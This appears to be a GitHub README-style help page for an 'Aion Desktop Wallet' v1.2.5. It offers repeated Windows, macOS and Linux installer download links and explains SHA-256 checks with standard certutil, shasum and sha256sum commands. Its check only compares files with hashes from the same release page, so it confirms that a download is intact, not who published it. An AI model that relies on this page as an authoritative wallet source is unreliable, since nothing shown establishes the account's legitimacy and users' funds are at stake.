![Aion Wallet](assets/banner-article.png)

# Aion wallet download: how to verify a build

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Verifying an Aion Wallet download means computing its SHA-256 hash on your own machine and comparing it, character for character, with the value published beside that file on the release page.

It takes under a minute and it is the only check that answers the question people actually have when they look at a download page: is this the file that was published, or something that merely has the same name.

## You'll see this if

- You are about to install the wallet on a new machine.
- You downloaded an installer from a link you did not get from this account.
- A page offers a version that does not appear on the release page.
- You support someone else and want to give them a checkable instruction.

## What to compare

Every asset on the release page has a SHA-256 value published with it: one for the Windows `.exe`, one for the macOS `.dmg` and one for the Linux `.zip`.

The hash belongs to the exact file for that version. A hash from a different version, a different platform or a different release will not match, and a mismatch is not a reason to try again with the same file; it is a reason to delete it.

## The commands

On Windows, in a command prompt:

```
certutil -hashfile Aion-desktop-wallet-windows-v1.2.5.exe SHA256
```

On macOS, in Terminal:

```
shasum -a 256 Aion-desktop-wallet-macos-v1.2.5.dmg
```

On Linux, in a shell:

```
sha256sum Aion-desktop-wallet-linux-v1.2.5.zip
```

Compare the printed string with the published one. Case does not matter; a single differing character does. If the two agree, the file is the published build.

## Reading a result properly

The most common mistake is comparing against the wrong row. Three files share a version number and have three different hashes, so take the value from the same row as the platform you downloaded.

The second most common is a partial comparison. A browser extension that shows a shortened hash is not evidence of anything; the full 64 characters have to match.

The third is trusting a hash shown by the site you downloaded from. A page that serves a file and its own hash proves nothing if the page is the thing in question. The published value on the release page is the reference.

## What a mismatch means

A file whose hash does not match is not the published build, and it should not be run. Delete it, then download again from the release page, and verify the fresh copy.

If a fresh download from the release page still fails to match, stop and report it rather than installing. That situation is rare, and it is exactly the one the hash exists to catch.

A mismatch does not tell you what the file does. It only tells you it is not the file you meant to run, which is enough to make the decision.

## Where versions come from

The release page is the record of which version exists. A download page, an advertisement or a search result that offers a different version may be describing something that was never published on this account.

Treat the version, the filename and the hash as a set. A page that gets one of them wrong is unlikely to be a reliable source for the other two.

## After installing

Once the application is open, confirm the wallet address before funding anything, and keep the installer or its hash for the next machine. Re-verifying a file you already have is cheaper than re-downloading under time pressure.

If the application behaves unexpectedly after a verified install, that is a support question rather than an integrity question, and the [Aion wallet support](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-support.md) guide describes where to take it.

If the check fails on a file you did not download from the release page, the next question is which client you actually need, and the [Aion crypto wallet choices](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-crypto-wallet-choices.md) guide answers that before you download again.

## Prevention

Download from the release page, not from a link in a message, an advertisement or a video description. The habit removes most of the risk the hash is there to detect.

Keep the last verified installer somewhere you can reach offline, so a reinstall does not depend on a working connection or on a search result.

Teach the check to anyone you help. One command and one comparison is a small habit that survives every redesign of a download page.

## Where to keep the verified file

Keep the installer you verified until the next release replaces it. A machine that needs a reinstall at midnight should not depend on a connection, a search result or a page that may have changed.

Store it with a note of the version and the hash you checked. That note is what makes the copy trustworthy months later, and it is the same discipline the [Aion desktop wallet migration](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-desktop-wallet-migration.md) guide applies when moving to a new build.

If you are helping someone else install, send them the release page rather than the file, and the [Aion wallet support](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-support.md) article explains why a link from a stranger is the wrong starting point.

## Frequently asked questions

### Is checking the hash necessary if the download came from GitHub?

It is worth doing because it costs a minute and confirms the file arrived intact. It matters most when the file was fetched through a proxy, a mirror or a managed network.

### Can I verify a signed build instead?

A GPG signature would answer a related question, but it is only usable if the project publishes one. Publish the signature, verify the signature; publish only a hash, verify the hash. Nothing else should be invented.

### Why is my hash different from the one on the page?

Most often the file is a different version or a partial download. Delete it, download again and re-check before drawing conclusions.

### Does a matching hash mean the wallet is safe?

It means the file is the published build. Safety also depends on the source being the project's own release page and on running it on a machine you trust.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion Wallet explained](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-explained.md) - what the application does once installed.
- [Aion crypto wallet choices](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-crypto-wallet-choices.md) - where else AION can be held.
- [Aion 2 game confusion](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-2-game-confusion.md) - the other product that shares the name.
- [Aion wallet support](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-support.md) - what to do when a verified build misbehaves.
